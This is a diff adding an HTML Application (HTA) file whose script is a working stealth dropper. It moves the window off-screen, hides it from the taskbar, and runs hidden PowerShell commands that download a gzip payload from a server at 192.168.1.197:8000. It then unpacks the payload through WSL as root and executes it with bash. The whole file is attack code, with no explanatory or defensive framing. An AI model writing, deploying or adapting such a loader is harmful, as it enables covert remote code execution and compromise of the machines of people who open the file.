@@ -1,0 +1,39 @@
+<html>
+<head>
+<script language="JScript">
+
+function sleep(milliseconds) {
+        timeStart = new Date().getTime();
+        while (true) {
+            elapsedTime = new Date().getTime() - timeStart;
+            if (elapsedTime > milliseconds) {
+                break;
+            }
+        }
+    }
+	
+	
+window.moveTo(-1, -1);
+window.blur();
+window.resizeTo(0, 0);
+WshShell = new ActiveXObject("WScript.Shell");
+outFile = " $home/2.gz";
+line1 = "%comspec% /k powershell.exe -WindowStyle hidden Invoke-Webrequest http:\/\/192.168.1.197:8000/ .gz -outfile";
+line2 = "%comspec% /k powershell.exe -WindowStyle hidden wsl -u root gzip -d /mnt/c/Users/$env:UserName/2.gz";
+line3 = "%comspec% /k powershell.exe -WindowStyle hidden wsl -u root bash /mnt/c/Users/$env:UserName/2";
+WshShell.Run(line1 + outFile);
+sleep(1000);
+WshShell.Run(line2);
+sleep(5000);
+WshShell.Run(line3);
+</script>
+<hta:application
+caption="no"
+windowState="minimize"
+showInTaskBar="no"
+scroll="no"
+navigable="no" />            <!--  -->
+</head>
+<body>
+</body>
+</html>
